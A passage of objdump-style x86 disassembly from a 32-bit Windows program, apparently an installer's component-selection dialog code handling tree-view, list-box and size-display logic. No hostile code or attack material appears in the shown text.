  404988:	75 0d                	jne    0x404997
  40498a:	39 3d 20 0d 42 00    	cmp    %edi,0x420d20
  404990:	75 05                	jne    0x404997
  404992:	e8 23 fc ff ff       	call   0x4045ba
  404997:	89 3d 20 0d 42 00    	mov    %edi,0x420d20
  40499d:	ff 75 14             	push   0x14(%ebp)
  4049a0:	ff 75 10             	push   0x10(%ebp)
  4049a3:	ff 75 0c             	push   0xc(%ebp)
  4049a6:	e8 8b f8 ff ff       	call   0x404236
  4049ab:	5f                   	pop    %edi
  4049ac:	5e                   	pop    %esi
  4049ad:	5b                   	pop    %ebx
  4049ae:	c9                   	leave
  4049af:	c2 10 00             	ret    $0x10
  4049b2:	55                   	push   %ebp
  4049b3:	8b ec                	mov    %esp,%ebp
  4049b5:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4049b9:	56                   	push   %esi
  4049ba:	8b 35 00 82 40 00    	mov    0x408200,%esi
  4049c0:	75 1c                	jne    0x4049de
  4049c2:	ff 75 14             	push   0x14(%ebp)
  4049c5:	68 fb 03 00 00       	push   $0x3fb
  4049ca:	e8 72 0e 00 00       	call   0x405841
  4049cf:	ff 75 14             	push   0x14(%ebp)
  4049d2:	6a 01                	push   $0x1
  4049d4:	68 66 04 00 00       	push   $0x466
  4049d9:	ff 75 08             	push   0x8(%ebp)
  4049dc:	ff d6                	call   *%esi
  4049de:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4049e2:	75 2d                	jne    0x404a11
  4049e4:	ff 75 14             	push   0x14(%ebp)
  4049e7:	ff 75 10             	push   0x10(%ebp)
  4049ea:	ff 15 70 81 40 00    	call   *0x408170
  4049f0:	85 c0                	test   %eax,%eax
  4049f2:	74 0e                	je     0x404a02
  4049f4:	6a 07                	push   $0x7
  4049f6:	e8 10 ca ff ff       	call   0x40140b
  4049fb:	85 c0                	test   %eax,%eax
  4049fd:	75 03                	jne    0x404a02
  4049ff:	40                   	inc    %eax
  404a00:	eb 02                	jmp    0x404a04
  404a02:	33 c0                	xor    %eax,%eax
  404a04:	50                   	push   %eax
  404a05:	6a 00                	push   $0x0
  404a07:	68 65 04 00 00       	push   $0x465
  404a0c:	ff 75 08             	push   0x8(%ebp)
  404a0f:	ff d6                	call   *%esi
  404a11:	33 c0                	xor    %eax,%eax
  404a13:	5e                   	pop    %esi
  404a14:	5d                   	pop    %ebp
  404a15:	c2 10 00             	ret    $0x10
  404a18:	55                   	push   %ebp
  404a19:	8b ec                	mov    %esp,%ebp
  404a1b:	83 ec 40             	sub    $0x40,%esp
  404a1e:	8b 45 14             	mov    0x14(%ebp),%eax
  404a21:	53                   	push   %ebx
  404a22:	56                   	push   %esi
  404a23:	8b 75 10             	mov    0x10(%ebp),%esi
  404a26:	57                   	push   %edi
  404a27:	6a dc                	push   $0xffffffdc
  404a29:	85 c0                	test   %eax,%eax
  404a2b:	5b                   	pop    %ebx
  404a2c:	74 0b                	je     0x404a39
  404a2e:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404a32:	c1 e8 14             	shr    $0x14,%eax
  404a35:	33 ff                	xor    %edi,%edi
  404a37:	eb 4e                	jmp    0x404a87
  404a39:	6a 14                	push   $0x14
  404a3b:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404a41:	59                   	pop    %ecx
  404a42:	8b c6                	mov    %esi,%eax
  404a44:	73 06                	jae    0x404a4c
  404a46:	6a 0a                	push   $0xa
  404a48:	59                   	pop    %ecx
  404a49:	6a dd                	push   $0xffffffdd
  404a4b:	5b                   	pop    %ebx
  404a4c:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404a52:	73 05                	jae    0x404a59
  404a54:	6a de                	push   $0xffffffde
  404a56:	33 c9                	xor    %ecx,%ecx
  404a58:	5b                   	pop    %ebx
  404a59:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404a5f:	73 0d                	jae    0x404a6e
  404a61:	33 c0                	xor    %eax,%eax
  404a63:	6a 14                	push   $0x14
  404a65:	40                   	inc    %eax
  404a66:	5f                   	pop    %edi
  404a67:	d3 e0                	shl    %cl,%eax
  404a69:	99                   	cltd
  404a6a:	f7 ff                	idiv   %edi
  404a6c:	03 c6                	add    %esi,%eax
  404a6e:	8b f0                	mov    %eax,%esi
  404a70:	25 ff ff ff 00       	and    $0xffffff,%eax
  404a75:	6a 0a                	push   $0xa
  404a77:	33 d2                	xor    %edx,%edx
  404a79:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404a7c:	03 c0                	add    %eax,%eax
  404a7e:	d3 e8                	shr    %cl,%eax
  404a80:	d3 ee                	shr    %cl,%esi
  404a82:	59                   	pop    %ecx
  404a83:	f7 f1                	div    %ecx
  404a85:	8b fa                	mov    %edx,%edi
  404a87:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404a8a:	6a df                	push   $0xffffffdf
  404a8c:	50                   	push   %eax
  404a8d:	e8 d1 16 00 00       	call   0x406163
  404a92:	50                   	push   %eax
  404a93:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404a96:	53                   	push   %ebx
  404a97:	50                   	push   %eax
  404a98:	e8 c6 16 00 00       	call   0x406163
  404a9d:	50                   	push   %eax
  404a9e:	57                   	push   %edi
  404a9f:	56                   	push   %esi
  404aa0:	68 24 a2 40 00       	push   $0x40a224
  404aa5:	ff 75 0c             	push   0xc(%ebp)
  404aa8:	be 30 0d 42 00       	mov    $0x420d30,%esi
  404aad:	56                   	push   %esi
  404aae:	e8 b0 16 00 00       	call   0x406163
  404ab3:	56                   	push   %esi
  404ab4:	8b f8                	mov    %eax,%edi
  404ab6:	e8 9c 16 00 00       	call   0x406157
  404abb:	03 f8                	add    %eax,%edi
  404abd:	57                   	push   %edi
  404abe:	ff 15 74 82 40 00    	call   *0x408274
  404ac4:	83 c4 18             	add    $0x18,%esp
  404ac7:	56                   	push   %esi
  404ac8:	ff 75 08             	push   0x8(%ebp)
  404acb:	ff 35 f8 3e 42 00    	push   0x423ef8
  404ad1:	e8 65 0d 00 00       	call   0x40583b
  404ad6:	5f                   	pop    %edi
  404ad7:	5e                   	pop    %esi
  404ad8:	5b                   	pop    %ebx
  404ad9:	c9                   	leave
  404ada:	c2 10 00             	ret    $0x10
  404add:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404ae1:	33 c9                	xor    %ecx,%ecx
  404ae3:	51                   	push   %ecx
  404ae4:	50                   	push   %eax
  404ae5:	ff 74 24 10          	push   0x10(%esp)
  404ae9:	ff 74 24 10          	push   0x10(%esp)
  404aed:	e8 26 ff ff ff       	call   0x404a18
  404af2:	c2 0c 00             	ret    $0xc
  404af5:	8b 15 6c 47 42 00    	mov    0x42476c,%edx
  404afb:	8b 0d 68 47 42 00    	mov    0x424768,%ecx
  404b01:	33 c0                	xor    %eax,%eax
  404b03:	85 d2                	test   %edx,%edx
  404b05:	74 18                	je     0x404b1f
  404b07:	56                   	push   %esi
  404b08:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404b0c:	74 07                	je     0x404b15
  404b0e:	8b 74 24 08          	mov    0x8(%esp),%esi
  404b12:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404b15:	81 c1 18 04 00 00    	add    $0x418,%ecx
  404b1b:	4a                   	dec    %edx
  404b1c:	75 ea                	jne    0x404b08
  404b1e:	5e                   	pop    %esi
  404b1f:	c2 04 00             	ret    $0x4
  404b22:	55                   	push   %ebp
  404b23:	8b ec                	mov    %esp,%ebp
  404b25:	83 ec 38             	sub    $0x38,%esp
  404b28:	56                   	push   %esi
  404b29:	8b 35 00 82 40 00    	mov    0x408200,%esi
  404b2f:	57                   	push   %edi
  404b30:	8b 7d 08             	mov    0x8(%ebp),%edi
  404b33:	6a 00                	push   $0x0
  404b35:	6a 09                	push   $0x9
  404b37:	68 0a 11 00 00       	push   $0x110a
  404b3c:	57                   	push   %edi
  404b3d:	ff d6                	call   *%esi
  404b3f:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404b43:	74 3c                	je     0x404b81
  404b45:	ff 15 ac 81 40 00    	call   *0x4081ac
  404b4b:	0f bf c8             	movswl %ax,%ecx
  404b4e:	c1 e8 10             	shr    $0x10,%eax
  404b51:	0f bf c0             	movswl %ax,%eax
  404b54:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404b57:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404b5a:	50                   	push   %eax
  404b5b:	57                   	push   %edi
  404b5c:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404b5f:	ff 15 c8 81 40 00    	call   *0x4081c8
  404b65:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404b68:	50                   	push   %eax
  404b69:	6a 00                	push   $0x0
  404b6b:	68 11 11 00 00       	push   $0x1111
  404b70:	57                   	push   %edi
  404b71:	ff d6                	call   *%esi
  404b73:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404b77:	75 05                	jne    0x404b7e
  404b79:	83 c8 ff             	or     $0xffffffff,%eax
  404b7c:	eb 1e                	jmp    0x404b9c
  404b7e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404b81:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404b84:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404b87:	50                   	push   %eax
  404b88:	6a 00                	push   $0x0
  404b8a:	68 0c 11 00 00       	push   $0x110c
  404b8f:	57                   	push   %edi
  404b90:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404b97:	ff d6                	call   *%esi
  404b99:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404b9c:	5f                   	pop    %edi
  404b9d:	5e                   	pop    %esi
  404b9e:	c9                   	leave
  404b9f:	c2 08 00             	ret    $0x8
  404ba2:	56                   	push   %esi
  404ba3:	57                   	push   %edi
  404ba4:	be 00 50 42 00       	mov    $0x425000,%esi
  404ba9:	bf 30 0d 42 00       	mov    $0x420d30,%edi
  404bae:	56                   	push   %esi
  404baf:	57                   	push   %edi
  404bb0:	e8 8c 15 00 00       	call   0x406141
  404bb5:	ff 74 24 10          	push   0x10(%esp)
  404bb9:	56                   	push   %esi
  404bba:	e8 e0 14 00 00       	call   0x40609f
  404bbf:	ff 74 24 0c          	push   0xc(%esp)
  404bc3:	e8 43 c8 ff ff       	call   0x40140b
  404bc8:	57                   	push   %edi
  404bc9:	56                   	push   %esi
  404bca:	e8 72 15 00 00       	call   0x406141
  404bcf:	5f                   	pop    %edi
  404bd0:	5e                   	pop    %esi
  404bd1:	c2 08 00             	ret    $0x8
  404bd4:	55                   	push   %ebp
  404bd5:	8b ec                	mov    %esp,%ebp
  404bd7:	83 ec 54             	sub    $0x54,%esp
  404bda:	53                   	push   %ebx
  404bdb:	56                   	push   %esi
  404bdc:	8b 35 d0 81 40 00    	mov    0x4081d0,%esi
  404be2:	57                   	push   %edi
  404be3:	68 f9 03 00 00       	push   $0x3f9
  404be8:	ff 75 08             	push   0x8(%ebp)
  404beb:	ff d6                	call   *%esi
  404bed:	68 08 04 00 00       	push   $0x408
  404bf2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404bf5:	ff 75 08             	push   0x8(%ebp)
  404bf8:	ff d6                	call   *%esi
  404bfa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404bfd:	a1 68 47 42 00       	mov    0x424768,%eax
  404c02:	8b 35 00 82 40 00    	mov    0x408200,%esi
  404c08:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404c0b:	a1 34 47 42 00       	mov    0x424734,%eax
  404c10:	33 db                	xor    %ebx,%ebx
  404c12:	05 94 00 00 00       	add    $0x94,%eax
  404c17:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404c1e:	6a 10                	push   $0x10
  404c20:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404c23:	5f                   	pop    %edi
  404c24:	0f 85 27 02 00 00    	jne    0x404e51
  404c2a:	8b 45 08             	mov    0x8(%ebp),%eax
  404c2d:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404c30:	a3 a0 47 42 00       	mov    %eax,0x4247a0
  404c35:	a1 6c 47 42 00       	mov    0x42476c,%eax
  404c3a:	c1 e0 02             	shl    $0x2,%eax
  404c3d:	50                   	push   %eax
  404c3e:	6a 40                	push   $0x40
  404c40:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  404c47:	ff 15 58 81 40 00    	call   *0x408158
  404c4d:	53                   	push   %ebx
  404c4e:	53                   	push   %ebx
  404c4f:	53                   	push   %ebx
  404c50:	53                   	push   %ebx
  404c51:	6a 6e                	push   $0x6e
  404c53:	a3 28 0d 42 00       	mov    %eax,0x420d28
  404c58:	ff 35 20 47 42 00    	push   0x424720
  404c5e:	ff 15 34 82 40 00    	call   *0x408234
  404c64:	83 0d 1c 0d 42 00 ff 	orl    $0xffffffff,0x420d1c
  404c6b:	68 dc 51 40 00       	push   $0x4051dc
  404c70:	6a fc                	push   $0xfffffffc
  404c72:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404c75:	ff 75 fc             	push   -0x4(%ebp)
  404c78:	ff 15 4c 82 40 00    	call   *0x40824c
  404c7e:	53                   	push   %ebx
  404c7f:	6a 06                	push   $0x6
  404c81:	6a 21                	push   $0x21
  404c83:	57                   	push   %edi
  404c84:	57                   	push   %edi
  404c85:	a3 24 0d 42 00       	mov    %eax,0x420d24
  404c8a:	ff 15 38 80 40 00    	call   *0x408038
  404c90:	68 ff 00 ff 00       	push   $0xff00ff
  404c95:	a3 14 0d 42 00       	mov    %eax,0x420d14
  404c9a:	ff 75 f4             	push   -0xc(%ebp)
  404c9d:	50                   	push   %eax
  404c9e:	ff 15 3c 80 40 00    	call   *0x40803c
  404ca4:	ff 35 14 0d 42 00    	push   0x420d14
  404caa:	6a 02                	push   $0x2
  404cac:	68 09 11 00 00       	push   $0x1109
  404cb1:	ff 75 fc             	push   -0x4(%ebp)
  404cb4:	ff d6                	call   *%esi
  404cb6:	53                   	push   %ebx
  404cb7:	53                   	push   %ebx
  404cb8:	68 1c 11 00 00       	push   $0x111c
  404cbd:	ff 75 fc             	push   -0x4(%ebp)
  404cc0:	ff d6                	call   *%esi
  404cc2:	3b c7                	cmp    %edi,%eax
  404cc4:	7d 0c                	jge    0x404cd2
  404cc6:	53                   	push   %ebx
  404cc7:	57                   	push   %edi
  404cc8:	68 1b 11 00 00       	push   $0x111b
  404ccd:	ff 75 fc             	push   -0x4(%ebp)
  404cd0:	ff d6                	call   *%esi
  404cd2:	ff 75 f4             	push   -0xc(%ebp)
  404cd5:	ff 15 60 80 40 00    	call   *0x408060
  404cdb:	33 ff                	xor    %edi,%edi
  404cdd:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404ce0:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404ce3:	3b c3                	cmp    %ebx,%eax
  404ce5:	74 27                	je     0x404d0e
  404ce7:	83 ff 20             	cmp    $0x20,%edi
  404cea:	74 03                	je     0x404cef
  404cec:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404cef:	50                   	push   %eax
  404cf0:	53                   	push   %ebx
  404cf1:	e8 6d 14 00 00       	call   0x406163
  404cf6:	50                   	push   %eax
  404cf7:	53                   	push   %ebx
  404cf8:	68 43 01 00 00       	push   $0x143
  404cfd:	ff 75 f8             	push   -0x8(%ebp)
  404d00:	ff d6                	call   *%esi
  404d02:	57                   	push   %edi
  404d03:	50                   	push   %eax
  404d04:	68 51 01 00 00       	push   $0x151
  404d09:	ff 75 f8             	push   -0x8(%ebp)
  404d0c:	ff d6                	call   *%esi
  404d0e:	47                   	inc    %edi
  404d0f:	83 ff 21             	cmp    $0x21,%edi
  404d12:	7c c9                	jl     0x404cdd
  404d14:	8b 7d 14             	mov    0x14(%ebp),%edi
  404d17:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404d1a:	ff 74 87 30          	push   0x30(%edi,%eax,4)
  404d1e:	6a 15                	push   $0x15
  404d20:	ff 75 08             	push   0x8(%ebp)
  404d23:	e8 a7 f4 ff ff       	call   0x4041cf
  404d28:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404d2b:	ff 74 87 34          	push   0x34(%edi,%eax,4)
  404d2f:	6a 16                	push   $0x16
  404d31:	ff 75 08             	push   0x8(%ebp)
  404d34:	e8 96 f4 ff ff       	call   0x4041cf
  404d39:	33 ff                	xor    %edi,%edi
  404d3b:	39 1d 6c 47 42 00    	cmp    %ebx,0x42476c
  404d41:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404d44:	0f 8e c9 00 00 00    	jle    0x404e13
  404d4a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404d4d:	8d 50 08             	lea    0x8(%eax),%edx
  404d50:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  404d53:	8d 42 10             	lea    0x10(%edx),%eax
  404d56:	38 18                	cmp    %bl,(%eax)
  404d58:	0f 84 97 00 00 00    	je     0x404df5
  404d5e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404d61:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404d64:	8b 02                	mov    (%edx),%eax
  404d66:	6a 20                	push   $0x20
  404d68:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  404d6b:	59                   	pop    %ecx
  404d6c:	8b d0                	mov    %eax,%edx
  404d6e:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  404d75:	23 d1                	and    %ecx,%edx
  404d77:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  404d7e:	a8 02                	test   $0x2,%al
  404d80:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  404d83:	89 7d d8             	mov    %edi,-0x28(%ebp)
  404d86:	89 55 bc             	mov    %edx,-0x44(%ebp)
  404d89:	74 3a                	je     0x404dc5
  404d8b:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404d8e:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  404d95:	50                   	push   %eax
  404d96:	53                   	push   %ebx
  404d97:	68 00 11 00 00       	push   $0x1100
  404d9c:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  404da3:	ff 75 fc             	push   -0x4(%ebp)
  404da6:	ff d6                	call   *%esi
  404da8:	8b 0d 28 0d 42 00    	mov    0x420d28,%ecx
  404dae:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404db5:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404db8:	a1 28 0d 42 00       	mov    0x420d28,%eax
  404dbd:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404dc0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404dc3:	eb 30                	jmp    0x404df5
  404dc5:	a8 04                	test   $0x4,%al
  404dc7:	74 14                	je     0x404ddd
  404dc9:	ff 75 f4             	push   -0xc(%ebp)
  404dcc:	6a 03                	push   $0x3
  404dce:	68 0a 11 00 00       	push   $0x110a
  404dd3:	ff 75 fc             	push   -0x4(%ebp)
  404dd6:	ff d6                	call   *%esi
  404dd8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404ddb:	eb 18                	jmp    0x404df5
  404ddd:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404de0:	50                   	push   %eax
  404de1:	53                   	push   %ebx
  404de2:	68 00 11 00 00       	push   $0x1100
  404de7:	ff 75 fc             	push   -0x4(%ebp)
  404dea:	ff d6                	call   *%esi
  404dec:	8b 0d 28 0d 42 00    	mov    0x420d28,%ecx
  404df2:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404df5:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404df8:	47                   	inc    %edi
  404df9:	81 c2 18 04 00 00    	add    $0x418,%edx
  404dff:	3b 3d 6c 47 42 00    	cmp    0x42476c,%edi
  404e05:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  404e08:	0f 8c 45 ff ff ff    	jl     0x404d53
  404e0e:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  404e11:	75 19                	jne    0x404e2c
  404e13:	6a f0                	push   $0xfffffff0
  404e15:	ff 75 fc             	push   -0x4(%ebp)
  404e18:	ff 15 9c 81 40 00    	call   *0x40819c
  404e1e:	24 fb                	and    $0xfb,%al
  404e20:	50                   	push   %eax
  404e21:	6a f0                	push   $0xfffffff0
  404e23:	ff 75 fc             	push   -0x4(%ebp)
  404e26:	ff 15 4c 82 40 00    	call   *0x40824c
  404e2c:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  404e2f:	75 18                	jne    0x404e49
  404e31:	6a 05                	push   $0x5
  404e33:	ff 75 f8             	push   -0x8(%ebp)
  404e36:	ff 15 48 82 40 00    	call   *0x408248
  404e3c:	ff 75 f8             	push   -0x8(%ebp)
  404e3f:	e8 c0 f3 ff ff       	call   0x404204
  404e44:	e9 7e 03 00 00       	jmp    0x4051c7
  404e49:	ff 75 fc             	push   -0x4(%ebp)
  404e4c:	e8 b3 f3 ff ff       	call   0x404204
  404e51:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404e58:	75 12                	jne    0x404e6c
  404e5a:	33 c9                	xor    %ecx,%ecx
  404e5c:	89 5d 10             	mov    %ebx,0x10(%ebp)
  404e5f:	41                   	inc    %ecx
  404e60:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404e67:	89 4d 14             	mov    %ecx,0x14(%ebp)
  404e6a:	eb 03                	jmp    0x404e6f
  404e6c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404e6f:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404e73:	b8 13 04 00 00       	mov    $0x413,%eax
  404e78:	74 09                	je     0x404e83
  404e7a:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404e7d:	0f 85 e4 00 00 00    	jne    0x404f67
  404e83:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404e86:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404e89:	74 0d                	je     0x404e98
  404e8b:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  404e92:	0f 85 cf 00 00 00    	jne    0x404f67
  404e98:	f6 05 3d 47 42 00 02 	testb  $0x2,0x42473d
  404e9f:	75 73                	jne    0x404f14
  404ea1:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404ea4:	74 09                	je     0x404eaf
  404ea6:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404ea9:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  404ead:	75 65                	jne    0x404f14
  404eaf:	33 c9                	xor    %ecx,%ecx
  404eb1:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404eb4:	0f 95 c1             	setne  %cl
  404eb7:	51                   	push   %ecx
  404eb8:	ff 75 fc             	push   -0x4(%ebp)
  404ebb:	e8 62 fc ff ff       	call   0x404b22
  404ec0:	8b f8                	mov    %eax,%edi
  404ec2:	3b fb                	cmp    %ebx,%edi
  404ec4:	7c 4e                	jl     0x404f14
  404ec6:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404ecc:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404ecf:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  404ed3:	8b 01                	mov    (%ecx),%eax
  404ed5:	a8 10                	test   $0x10,%al
  404ed7:	75 3b                	jne    0x404f14
  404ed9:	a8 40                	test   $0x40,%al
  404edb:	74 11                	je     0x404eee
  404edd:	35 80 00 00 00       	xor    $0x80,%eax
  404ee2:	84 c0                	test   %al,%al
  404ee4:	79 04                	jns    0x404eea
  404ee6:	0c 01                	or     $0x1,%al
  404ee8:	eb 07                	jmp    0x404ef1
  404eea:	24 fe                	and    $0xfe,%al
  404eec:	eb 03                	jmp    0x404ef1
  404eee:	83 f0 01             	xor    $0x1,%eax
  404ef1:	57                   	push   %edi
  404ef2:	89 01                	mov    %eax,(%ecx)
  404ef4:	e8 84 c2 ff ff       	call   0x40117d
  404ef9:	a1 3c 47 42 00       	mov    0x42473c,%eax
  404efe:	47                   	inc    %edi
  404eff:	f7 d0                	not    %eax
  404f01:	c1 e8 08             	shr    $0x8,%eax
  404f04:	83 e0 01             	and    $0x1,%eax
  404f07:	89 7d 10             	mov    %edi,0x10(%ebp)
  404f0a:	89 45 14             	mov    %eax,0x14(%ebp)
  404f0d:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404f14:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  404f17:	74 4e                	je     0x404f67
  404f19:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f1c:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  404f23:	75 0e                	jne    0x404f33
  404f25:	ff 70 5c             	push   0x5c(%eax)
  404f28:	53                   	push   %ebx
  404f29:	68 19 04 00 00       	push   $0x419
  404f2e:	ff 75 fc             	push   -0x4(%ebp)
  404f31:	ff d6                	call   *%esi
  404f33:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f36:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  404f3d:	75 28                	jne    0x404f67
  404f3f:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404f43:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404f46:	8b 40 5c             	mov    0x5c(%eax),%eax
  404f49:	75 0f                	jne    0x404f5a
  404f4b:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404f51:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404f55:	83 08 20             	orl    $0x20,(%eax)
  404f58:	eb 0d                	jmp    0x404f67
  404f5a:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404f60:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404f64:	83 20 df             	andl   $0xffffffdf,(%eax)
  404f67:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404f6e:	75 6f                	jne    0x404fdf
  404f70:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404f76:	0f 85 4b 02 00 00    	jne    0x4051c7
  404f7c:	8b 45 10             	mov    0x10(%ebp),%eax
  404f7f:	c1 e8 10             	shr    $0x10,%eax
  404f82:	66 3d 01 00          	cmp    $0x1,%ax
  404f86:	0f 85 3b 02 00 00    	jne    0x4051c7
  404f8c:	53                   	push   %ebx
  404f8d:	53                   	push   %ebx
  404f8e:	68 47 01 00 00       	push   $0x147
  404f93:	ff 75 f8             	push   -0x8(%ebp)
  404f96:	ff d6                	call   *%esi
  404f98:	83 f8 ff             	cmp    $0xffffffff,%eax
  404f9b:	0f 84 26 02 00 00    	je     0x4051c7
  404fa1:	53                   	push   %ebx
  404fa2:	50                   	push   %eax
  404fa3:	68 50 01 00 00       	push   $0x150
  404fa8:	ff 75 f8             	push   -0x8(%ebp)
  404fab:	ff d6                	call   *%esi
  404fad:	8b f8                	mov    %eax,%edi
  404faf:	83 ff ff             	cmp    $0xffffffff,%edi
  404fb2:	74 08                	je     0x404fbc
  404fb4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404fb7:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  404fba:	75 03                	jne    0x404fbf
  404fbc:	6a 20                	push   $0x20
  404fbe:	5f                   	pop    %edi
  404fbf:	57                   	push   %edi
  404fc0:	e8 d4 c2 ff ff       	call   0x401299
  404fc5:	57                   	push   %edi
  404fc6:	53                   	push   %ebx
  404fc7:	68 20 04 00 00       	push   $0x420
  404fcc:	ff 75 08             	push   0x8(%ebp)
  404fcf:	ff d6                	call   *%esi
  404fd1:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  404fd5:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404fd8:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404fdf:	b8 00 02 00 00       	mov    $0x200,%eax
  404fe4:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404fe7:	75 08                	jne    0x404ff1
  404fe9:	53                   	push   %ebx
  404fea:	53                   	push   %ebx
  404feb:	50                   	push   %eax
  404fec:	ff 75 fc             	push   -0x4(%ebp)
  404fef:	ff d6                	call   *%esi
  404ff1:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404ff8:	75 32                	jne    0x40502c
  404ffa:	a1 14 0d 42 00       	mov    0x420d14,%eax
  404fff:	3b c3                	cmp    %ebx,%eax
  405001:	74 07                	je     0x40500a
  405003:	50                   	push   %eax
  405004:	ff 15 44 80 40 00    	call   *0x408044
  40500a:	a1 28 0d 42 00       	mov    0x420d28,%eax
  40500f:	3b c3                	cmp    %ebx,%eax
  405011:	74 07                	je     0x40501a
  405013:	50                   	push   %eax
  405014:	ff 15 5c 81 40 00    	call   *0x40815c
  40501a:	89 1d 14 0d 42 00    	mov    %ebx,0x420d14
  405020:	89 1d 28 0d 42 00    	mov    %ebx,0x420d28
  405026:	89 1d a0 47 42 00    	mov    %ebx,0x4247a0
  40502c:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  405033:	0f 85 50 01 00 00    	jne    0x405189
  405039:	53                   	push   %ebx
  40503a:	53                   	push   %ebx
  40503b:	e8 af c1 ff ff       	call   0x4011ef
  405040:	8b 45 10             	mov    0x10(%ebp),%eax
  405043:	3b c3                	cmp    %ebx,%eax
  405045:	74 0e                	je     0x405055
  405047:	83 f8 ff             	cmp    $0xffffffff,%eax
  40504a:	74 01                	je     0x40504d
  40504c:	48                   	dec    %eax
  40504d:	50                   	push   %eax
  40504e:	6a 08                	push   $0x8
  405050:	e8 4d fb ff ff       	call   0x404ba2
